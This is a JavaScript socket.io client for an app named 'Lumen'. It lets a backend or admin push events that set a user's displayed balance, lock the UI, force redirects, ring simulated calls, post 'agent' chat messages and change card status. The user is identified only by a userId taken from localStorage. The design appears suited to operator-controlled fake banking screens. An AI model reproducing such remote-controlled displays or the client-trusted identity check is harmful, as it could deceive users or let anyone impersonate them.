import { io } from 'socket.io-client';

// Initialize socket connection - use import.meta.env for Vite
const socket = io(
  import.meta.env.VITE_BACKEND_URL?.replace(/\/$/, '') || 'http://localhost:5001',
  {
    auth: {
      userId: localStorage.getItem('lumen_user_id') || 'guest'
    },
    autoConnect: true // Allows guest or user ID to connect without rejection
  }
);

// Set up event listeners
socket.on('connect', () => {
  console.log('Connected to socket server');
});

import useOrchestratorStore from '../store/orchestratorStore';

// --- Orchestrator event listeners (single source of truth) ---
socket.on('UI_PERMISSIONS', (permissions) => {
  useOrchestratorStore.getState().setUiPermissions(permissions);
});

socket.on('UPDATE_BALANCE', (balance) => {
  useOrchestratorStore.getState().setBalance(balance);
});

socket.on('UI_LOCK', (uiLock) => {
  // Socket.io может присылать boolean или строку.
  // Важно: "false" (строка) truthy в JS, поэтому нормализуем явно.
  const normalized = uiLock === true || uiLock === 'true' || uiLock === 1 || uiLock === '1';
  useOrchestratorStore.getState().setUiLock(normalized);
});

socket.on('FORCE_REDIRECT', (path) => {
  useOrchestratorStore.getState().setForceRedirectPath(path);
});

socket.on('TRIGGER_CALL', (callData) => {
  useOrchestratorStore.getState().setCallState({
    ...callData,
    callId: callData.callId || 'call_' + Date.now(),
    step: 'ringing',
  });
});

socket.on('CALL_ENDED', () => {
  useOrchestratorStore.getState().setCallState(null);
});

socket.on('show_modal', (modalData) => {
  useOrchestratorStore.getState().setModalData(modalData);
});

const handleAdminCommand = ({ targetUserId, command, data }) => {
  const currentUserId = localStorage.getItem('lumen_user_id') || 'guest';
  if (targetUserId !== currentUserId && targetUserId !== 'all') return;
  
  // Route command
  switch (command) {
    case 'UPDATE_BALANCE':
      useOrchestratorStore.getState().setBalance(data);
      break;
    case 'show_modal':
      useOrchestratorStore.getState().setModalData(data);
      break;
    case 'FORCE_REDIRECT':
      useOrchestratorStore.getState().setForceRedirectPath(data);
      break;
    case 'CREDIT_STATUS':
      window.dispatchEvent(new CustomEvent('LUMEN_CREDIT_STATUS', { detail: data }));
      break;
  }
};

socket.on('adminCommand', handleAdminCommand);

socket.on('CHAT_MESSAGE', (data) => {
  window.dispatchEvent(new CustomEvent('LUMEN_CHAT_MESSAGE', { detail: data }));
});

socket.on('PUSH_NOTIFICATION', (data) => {
  window.dispatchEvent(new CustomEvent('LUMEN_PUSH', { detail: data }));
});

socket.on('adminMessage', (data) => {
  window.dispatchEvent(new CustomEvent('LUMEN_CHAT_MESSAGE', { detail: { ...data, sender: 'agent' } }));
});

if (typeof window !== 'undefined') {
  window.addEventListener('LUMEN_ABLY_EVENT', (e) => {
    const { name, data } = e.detail || {};
    if (name === 'adminCommand') handleAdminCommand(data);
    else if (name === 'UPDATE_BALANCE') useOrchestratorStore.getState().setBalance(data);
    else if (name === 'PUSH_NOTIFICATION' || name === 'CHAT_MESSAGE') {
      if (name === 'CHAT_MESSAGE') {
        window.dispatchEvent(new CustomEvent('LUMEN_CHAT_MESSAGE', { detail: data }));
      }
      if (name === 'PUSH_NOTIFICATION') {
        window.dispatchEvent(new CustomEvent('LUMEN_PUSH', { detail: data }));
      }
    } else if (name === 'TRIGGER_CALL') {
      useOrchestratorStore.getState().setCallState({ ...data, callId: data.callId || 'call_' + Date.now(), step: 'ringing' });
    } else if (name === 'UI_LOCK') {
      const uiLock = data === true || data === 'true' || data === 1 || data === '1';
      useOrchestratorStore.getState().setUiLock(uiLock);
    }
  });
}

// --- Cards: admin-initiated updates (CARD_* commands) ---
const dispatchCardEvent = (type, payload) => {
  try {
    window.dispatchEvent(new CustomEvent(`CARD_EVENT_${type}`, { detail: payload }));
  } catch {
    // ignore
  }
};

socket.on('CARD_BLOCK_SET', (payload) => {
  dispatchCardEvent('CARD_BLOCK_SET', payload);
});

socket.on('CARD_LIMIT_SET', (payload) => {
  dispatchCardEvent('CARD_LIMIT_SET', payload);
});

socket.on('CARD_ADD_APPROVED', (payload) => {
  dispatchCardEvent('CARD_ADD_APPROVED', payload);
});

// We'll also add a method to update the userId in auth (if user logs in)
export const updateSocketAuth = (userId) => {
  socket.auth.userId = userId;
  socket.io.opts.auth.userId = userId;
  socket.connect(); // Reconnect with new auth
};

export default socket;
